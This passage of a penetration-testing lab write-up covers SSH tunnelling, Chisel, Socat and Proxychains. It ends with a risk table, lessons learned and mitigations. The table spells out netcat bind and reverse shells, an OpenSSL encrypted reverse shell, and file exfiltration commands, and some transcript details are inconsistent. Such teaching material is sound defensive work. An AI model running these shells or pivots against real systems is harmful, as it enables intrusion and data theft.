# Shows that SSH is accepting connections on both ports

```
```bash
admin@192.168.1.100:~$ ssh -R 2222:localhost:22 admin@192.168.1.100
Welcome to Ubuntu 20.04.3 LTS
Remote port forwarding established: 192.168.1.100:2222 -> localhost:22
admin@192.168.1.100:~$
# Remote port forwarding created
# Port 2222 on the victim machine now forwards to port 22 on the client machine
# This allows the remote system to SSH back into the attacker's machine

```
```bash
admin@192.168.1.100:~$ curl http://localhost:8080
HTTP/1.1 200 OK
Content-Type: text/html
# HTTP request succeeded through the SSH tunnel
# Confirms local port forwarding is working

<!DOCTYPE html>
<html>
<head><title>Internal Service</title></head>
<body>
<h1>Welcome to Internal Service</h1>
<p>Successfully accessed through SSH local port forwarding!</p>
</body>
</html>
# The internal web page was retrieved successfully
# Demonstrates access to an internal service via the forwarded port

```
### 8.7 Advanced Tunneling with Chisel & Socat
**Purpose:**

**Chisel:** Chisel used to create secure tunnels over HTTP/HTTPS, especially reverse tunnels, to access internal services across firewalls or restricted networks (network pivoting and remote access).

**Socat:** Socat is used as a versatile port forwarder and relay tool to connect two network endpoints, enabling traffic redirection, tunneling, and access to internal services through specific ports.

The purpose of this exercise was to demonstrate advanced network tunneling techniques using Chisel and Socat to enable access to internal services across restricted networks. It aimed to show how Chisel can create secure reverse tunnels over HTTP/HTTPS to bypass firewalls and pivot into internal environments, while Socat can relay traffic between ports to forward connections to otherwise unreachable services. The exercise highlighted how these tools are used in penetration testing and system administration to maintain connectivity, bypass network controls, and expose internal applications securely.

**Outcome:**
A Chisel server was successfully launched on the victim machine with reverse tunneling enabled, and the attacker machine established a Chisel client connection that created a tunnel from the attacker’s localhost to an internal web service on the victim network. This confirmed that Chisel can securely expose internal services through restricted network boundaries. Additionally, a Socat listener was configured to forward traffic from a local port to an internal API service, demonstrating effective port relaying. Testing with a web request verified that the internal service was reachable through the established tunnels. Overall, both tools successfully enabled access to internal resources, demonstrating their effectiveness for network pivoting, firewall bypass, and controlled remote access.

```bash
# ===================== Victim Machine Chisel Server =====================


Victim Machine (192.168.1.100)
Welcome to Ubuntu 20.04.3 LTS
victim@target:~$ 
victim@target:~$ chisel server --port 8080 --reverse
2021/12/13 10:30:15 server: Reverse tunnelling enabled
2021/12/13 10:30:15 server: Listening on :8080
2021/12/13 10:30:15 server: Ready to accept connections
victim@target:~$ 
# Reverse tunneling mode was enabled, allowing clients to expose services back through the server.
# Chisel server was successfully bound to port 8080 and is awaiting connections.
# Server initialization completed; it is ready for client tunnels.

```

```bash

# ===================== Attacker Machine — Chisel Client =====================

pentester@kali-linux:~$ chisel client 192.168.1.100:8080 R:8080:internal-web.local:80
2021/12/13 10:30:15 client: Connected to 192.168.1.100:8080
2021/12/13 10:30:15 client: Tunnel established: localhost:8080 -> internal-web.local:80
2021/12/13 10:30:15 client: Ready to accept connections
# Client successfully established a control connection to the Chisel server.
# Reverse tunnel created: local port 8080 now forwards traffic to the internal web service on port 80.
# Tunnel is active and ready to proxy traffic.

```
```bash
# ===================== Attacker Machine — Socat Tunnel =====================

pentester@kali-linux:~$ socat TCP-LISTEN:9090,fork TCP:internal-api.local:8080
socat: listening on port 9090, forwarding to internal-api.local:8080
# Socat is acting as a relay, forwarding connections from local port 9090 to the internal API service.

socat: accepting connection from any host on port 9090
# Socat is actively waiting for incoming connections; 'fork' allows multiple simultaneous sessions.

```
```bash
# ===================== Tunnel Test =====================

pentester@kali-linux:~$ curl http://localhost:8080
HTTP/1.1 200 OK
# Successful HTTP response confirms the tunnel is working.

Content-Type: text/html

<!DOCTYPE html>
<html>
<head><title>Internal Service</title></head>
<body>
<h1>Welcome to Internal Service</h1>
<p>Successfully accessed through advanced tunneling!</p>
</body>
</html>
# Internal web application content retrieved via the Chisel tunnel.

pentester@kali-linux:~$
```

### 8.8 Proxychains - Universal Proxy Routing
**Purpose:**
The purpose of this exercise was to demonstrate how to route application traffic through a SOCKS proxy using SSH dynamic port forwarding and Proxychains. It aimed to show how a secure tunnel can be created to pivot into an internal network and force external tools (such as Nmap and Curl) to operate through that tunnel. This technique is commonly used to access internal services that are otherwise unreachable and to mask the true origin of network traffic by sending it through an intermediary host.

**Outcome:**
The SSH service was successfully started on the victim machine, allowing remote connections. A SOCKS proxy was created on the attacker machine using SSH dynamic port forwarding (-D 1080), providing a local proxy endpoint. Proxychains was verified to be correctly configured to use this proxy (127.0.0.1:1080). Network scanning with Nmap was successfully routed through the proxy, enabling discovery of the internal web service (internal-web.local) that would normally be inaccessible. Additionally, external IP testing confirmed that traffic sent through the proxy originated from the victim machine rather than the attacker machine. This demonstrated successful network pivoting, anonymization of tool traffic, and controlled access to internal resources through a secure SSH tunnel.

```bash
Victim Machine (192.168.1.100)
Welcome to Ubuntu 20.04.3 LTS
victim@target:~$ 
victim@target:~$ systemctl start ssh
● ssh.service - OpenBSD Secure Shell server
   Active: active (running) since Mon 2021-12-13 10:30:15 UTC; 2s ago
# SSH server started successfully; system is now ready to accept remote SSH connections.

victim@target:~$
```

```bash
pentester@kali-linux:~$ ssh -D 1080 admin@192.168.1.100
Welcome to Ubuntu 20.04.3 LTS
Dynamic forwarding established on localhost:1080
# SSH dynamic port forwarding created a SOCKS proxy on the attacker's machine at 127.0.0.1:1080.

admin@192.168.1.100:~$ 
```
```bash
admin@192.168.1.100:~$ cat /etc/proxychains.conf

# proxychains.conf  VER 4.x
#
#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
#

# The option below identifies how the ProxyList is treated.
# only one option should be uncommented at time,
# otherwise the last appearing option will be accepted
#
#dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#
strict_chain
#
# Strict - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# all proxies must be online to play in chain
# otherwise EINTR is returned to the app
#
#random_chain
#
# Random - Each connection will be done via random proxy
# (or proxy chain, see  chain_len) from the list.
# this option is good to test your IDS :)

# Make sense only if random_chain
#chain_len = 2

# Quiet mode (no output from library)
#quiet_mode

# Proxy DNS requests - no leak for DNS data
proxy_dns

# Some timeouts in milliseconds
tcp_connect_time_out 8000
tcp_read_time_out 8000

# ProxyList format
#       type  host  port [user pass]
#       (values separated by 'tab' or 'blank')
#
#
#        Examples:
#
#            	socks5	192.168.67.78	1080	lamer	secret
#		http	192.168.89.3	8080	justu	hidden
#	 	socks4	192.168.1.49	1080
#	        http	192.168.39.93	8080
#
#
#       proxy types: http, socks4, socks5
#        ( auth types: user/pass )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080

# Proxychains will route traffic through the local SOCKS5 proxy created by SSH.
```
```bash
admin@192.168.1.100:~$ proxychains nmap -sT -p 80 internet-web.local
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  OK
# Proxychains successfully routed Nmap traffic through the SOCKS proxy.

Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-13 10:30 UTC
Nmap scan report for internal-web.local (192.168.1.200)
Host is up (0.001s latency).
# Internal host responded, confirming pivot access into the internal network.

PORT   STATE SERVICE
80/tcp open  http
# HTTP service on port 80 is reachable through the proxy tunnel.


Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds

admin@192.168.1.100:~$ curl https://ifconfig.me
203.0.113.45
# Public IP shown is the attacker's normal external IP because this request did NOT use Proxychains.

admin@192.168.1.100:~$
```

## 9. Findings and Risk Table
| **Tool Used**      | **Technique Type**                                | **Command(s) Executed**                                                                                                                                                                                      | **Key Output / Observed Result**                               | **Insight Gained**                                           | **Risk Level** | **Lessons Learned**                                                     | **Recommended Action / Mitigation**                                                              | **Conclusion**                                               |
|--------------------|-------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------|-------------------------------------------------------------|----------------|-------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------|--------------------------------------------------------------|
| **Netcat (nc)**    | Bind Shell (Victim listening, attacker connects) | `nc -l -p 4444 -e /bin/bash` (victim) • `nc 192.168.56.210 4444` (attacker)                                                                                                                                | Attacker gained remote shell and executed enumeration commands | A single exposed port allowed unrestricted command execution | **High**       | Unprotected listeners enabled instant system takeover                   | Block unauthorized listeners; enforce host firewalls; restrict shell binaries; enable monitoring | Bind shells granted full compromise with no authentication   |
| **Netcat (nc)**    | System enumeration via shell                     | `id`, `whoami`, `pwd`, `ls`, `ifconfig`, `uname`, `ps`, `netstat`                                                                                                                                            | OS, user, directory, network, and process details were exposed | Attackers gathered intelligence within seconds               | **High**       | Enumeration was the first step toward privilege escalation and pivoting | Enforce least privilege; enable logging and alerts for suspicious commands                       | Rapid environment mapping occurred once shell access existed |
| **Netcat (nc)**    | Reverse Shell (Attacker listens, victim connects) | `nc -lvp 4444` (attacker) • `nc 192.168.56.200 4444 -e /bin/bash` (victim)                                                                                                                               | Attacker received shell through outbound connection            | Outbound traffic bypassed inbound firewall protections       | **Critical**   | Inbound filtering alone was ineffective without egress controls         | Restrict outbound traffic; monitor unusual connections                                           | Reverse shells bypassed traditional firewall rules           |
| **Netcat (nc)**    | File Transfer                                    | `nc -l -p 4444 > cert.pem` (victim) • `nc 192.168.56.210 4444 < cert.pem` (attacker)                                                                                                                      | Certificate file was transferred successfully                  | Netcat functioned as a simple file transfer tool             | **Medium**     | Networking tools could be abused for covert data movement               | Monitor unusual port usage; restrict unauthorized tools                                          | Demonstrated file exfiltration using common utilities        |
| **OpenSSL**        | Certificate & Key Generation                     | `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes`                                                                                                                         | Self‑signed certificate and private key were created           | Attackers could generate encryption materials quickly        | **Medium**     | Secure channels could be prepared in minutes                            | Monitor key generation activity; restrict unnecessary OpenSSL use                                | Encryption setup required no elevated privileges             |
| **OpenSSL**        | Encrypted Reverse Shell                          | `openssl s_server -quiet -key key.pem -cert cert.pem -port 4444` (attacker) • `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 \| openssl s_client -quiet -connect 192.168.56.200:4444 > /tmp/s; rm /tmp/s` (victim) | Encrypted reverse shell established over TLS                   | Command traffic was hidden inside encrypted channel          | **Critical**   | Encrypted shells were stealthier than plaintext shells                  | Use EDR, behavior analytics, restrict shell execution                                            | Demonstrated covert command‑and‑control via TLS              |
| **SSH**            | Password Authentication                          | `systemctl start ssh` (victim) • `ssh admin@192.168.1.100` (attacker)                                                                                                                                       | Remote login succeeded using password                          | Credentials alone enabled full remote access                 | **High**       | Weak or reused passwords risk compromise                                | Enforce strong passwords; MFA; limit SSH exposure                                                | Password‑based SSH can be secure but is attack‑prone         |
| **SSH**            | Key‑Based Authentication                         | `ssh -i user_key.pem user@192.168.1.100`                                                                                                                                                                    | Password‑less secure login succeeded                           | Private keys provided stronger authentication                | **Medium**     | Key management is critical for security                                 | Protect private keys; disable password login where possible                                      | Public‑key auth improves security when properly managed      |
| **SCP (SSH)**      | Secure File Upload                               | `scp local_file.txt admin@192.168.1.100:/tmp/`                                                                                                                                                               | File successfully transferred to victim                        | SSH channels enable secure data transfer                     | **Medium**     | Legitimate tools can be used for exfiltration                           | Monitor file transfers; apply DLP controls                                                       | Secure copy can move sensitive data unnoticed                |
| **SCP (SSH)**      | Secure File Download                             | `scp admin@192.168.1.100:/home/admin/secret.txt .`                                                                                                                                                           | Sensitive file retrieved from victim                           | Attackers can extract data over encrypted channels           | **High**       | Encrypted transfers evade simple monitoring                             | Inspect outbound traffic; restrict SSH where unnecessary                                         | Demonstrated secure data exfiltration                        |
| **SSH**            | Dynamic Port Forwarding (SOCKS Proxy)            | `ssh -D 1080 admin@192.168.1.100` • `curl --socks5 localhost:1080 http://internal-web.local`                                                                                                                | Internal service accessed through proxy                        | SSH can pivot into internal networks                         | **High**       | Single foothold enables broad network access                            | Restrict SSH tunneling; monitor unusual proxy behavior                                           | Dynamic forwarding enabled stealthy lateral movement         |
| **SSH**            | Proxy IP Masking Test                            | `curl https://ifconfig.me` • `curl --socks5 localhost:1080 https://ifconfig.me`                                                                                                                             | Different IPs observed (public vs victim)                      | Traffic origin can be hidden via proxy                       | **Medium**     | Attribution becomes difficult                                           | Monitor anomalous outbound routes                                                                | Proxies can obscure attacker location                        |
| **SSH**            | Local Port Forwarding                            | `ssh -L 8080:internal-web.local:80 admin@192.168.1.100` • `curl http://localhost:8080`                                                                                                                      | Internal web service accessed locally                          | Internal services exposed externally                         | **High**       | Port forwarding bypasses segmentation                                   | Disable port forwarding where not needed                                                         | Local tunnels expose protected resources                     |
| **SSH**            | Remote Port Forwarding (Reverse Tunnel)          | `ssh -R 2222:localhost:22 admin@192.168.1.100`                                                                                                                                                               | Remote system exposed attacker’s SSH port                      | External access created into attacker network                | **High**       | Reverse tunnels bypass NAT/firewalls                                    | Monitor listening ports; restrict SSH options                                                    | Enables hidden backdoor access paths                         |
| **Chisel**         | Reverse Tunneling / Pivoting                     | `chisel server --port 8080 --reverse` (victim) • `chisel client 192.168.1.100:8080 R:8080:internal-web.local:80`                                                                                            | Tunnel established to internal web service                     | HTTP‑based tunnels bypass many defenses                      | **High**       | Specialized tools enable stealth pivoting                               | Detect unusual persistent connections                                                            | Chisel enabled access to internal services                   |
| **Socat**          | TCP Relay Tunnel                                 | `socat TCP-LISTEN:9090,fork TCP:internal-api.local:8080`                                                                                                                                                     | Local port forwarded to internal API                           | Generic tools can replicate tunneling functions              | **High**       | Simple utilities can enable powerful pivots                             | Monitor port listeners; restrict tool availability                                               | Socat provided flexible traffic redirection                  |
| **Proxychains**    | Tool Routing Through Proxy                       | `cat /etc/proxychains.conf` • `proxychains nmap -sT -p 80 internal-web.local`                                                                                                                               | Nmap scan succeeded through SOCKS proxy                        | Any tool can operate through tunnels                         | **High**       | Pivoting extends attacker reach significantly                           | Monitor scanning activity; block unauthorized proxies                                            | Proxychains enabled reconnaissance inside network            |
| **Proxychains**    | External IP Check via Proxy                      | `proxychains curl https://ifconfig.me`                                                                                                                                                                      | IP reflected proxy/victim address                              | Proxy concealed true origin of traffic                       | **Medium**     | Identity masking complicates detection                                  | Use anomaly detection and logging                                                                | Demonstrated anonymized outbound communication               |
| **Multiple Tools** | Session Termination                              | `exit`                                                                                                                                                                                                      | Sessions closed without persistence                            | Access lost after termination                                | **Low**        | Persistence required for long‑term control                              | Monitor session logs; harden systems                                                             | Temporary shells highlighted need for persistence            |


## 10. Troubleshooting
When commands failed or services did not respond:

- The current shell was validated using the command `echo $SHELL`
- If incorrect, the **start_script.sh** was re-run
- The lab state was verified again using `running`

This ensured tool execution remained within the designated training environment.
## 11. Summary and Lesson Learnt
### Summary
During this lab exercise, a variety of tools and techniques were employed to simulate penetration testing and network pivoting. Initial access was achieved using Netcat bind and reverse shells, as well as OpenSSL‑based encrypted shells, highlighting how attackers can bypass firewall rules and use encrypted channels for stealth. SSH was used to demonstrate both password and key-based authentication, along with SCP for secure file transfer. Advanced tunneling techniques were practiced using SSH dynamic, local, and remote port forwarding, Chisel, and Socat, enabling access to internal services and creation of persistent tunnels. Proxychains was configured to route traffic through SOCKS proxies, demonstrating obfuscation of attack traffic and IP masking. Overall, the exercises showcased how common system tools can be abused for access, pivoting, data exfiltration, and stealthy network operations.

### Lessons Learned
1. Exposed Services Are High-Risk: Even a single open port like SSH or Netcat can allow complete system compromise if not properly secured.

2. Reverse Shells Bypass Firewalls: Outbound connections from the victim can circumvent inbound firewall rules, emphasizing the need for egress monitoring.

3. Encryption Can Hide Malicious Activity: Tools like OpenSSL can conceal data transfers and reverse shells, making detection challenging without deep inspection.

4. SSH Keys vs Passwords: Key-based authentication offers stronger security but must be protected; password-based authentication can be brute-forced or reused.

5. Tunneling Enables Pivoting: SSH port forwarding, Chisel, and Socat can expose internal resources, demonstrating the risk of internal network traversal.

6. Proxychains Masks Traffic: Routing tools through SOCKS proxies can obfuscate attacker activity and IP origin, complicating monitoring.

7. Enumeration is Key for Lateral Movement: Commands like uname, netstat, ps, and ifconfig provide attackers with intelligence for privilege escalation and pivoting.

8. Temporary Access Requires Persistence: Exiting shells ends access; attackers often use persistent tunnels or backdoors to maintain control.

9. Layered Defenses Are Essential: Reliance solely on firewalls is insufficient—combining monitoring, logging, endpoint protection, egress control, and behavioral analytics is necessary.

## 11. Conclusion

The lab exercises demonstrated how attackers can leverage common tools like Netcat, OpenSSL, SSH, Chisel, Socat, and Proxychains to gain access, exfiltrate data, pivot through networks, and evade detection. Both simple and advanced techniques were explored, from basic bind/reverse shells to encrypted tunnels and SOCKS proxy routing. The exercises highlighted the importance of securing exposed services, enforcing strong authentication, monitoring both inbound and outbound traffic, and deploying layered defenses. Overall, the exercises reinforced that even legitimate system tools can be abused for malicious purposes, emphasizing the critical need for proactive security controls, continuous monitoring, and strict access policies to mitigate risks in real-world environments.